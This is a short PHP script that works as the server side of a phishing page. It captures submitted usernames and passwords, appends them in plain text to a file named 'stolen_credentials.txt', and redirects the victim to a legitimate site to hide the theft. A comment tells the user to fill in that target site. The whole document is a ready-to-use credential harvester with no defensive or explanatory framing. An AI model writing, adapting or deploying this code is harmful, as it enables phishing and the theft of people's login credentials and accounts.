<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Log the credentials to a file
    $file = fopen('stolen_credentials.txt', 'a');
    fwrite($file, "Username: $username | Password: $password\n");
    fclose($file);

    // Redirect the user to the legitimate login page
    header('Location: https://example.com'); // Replace with a legitimate website
    exit();
}
?>
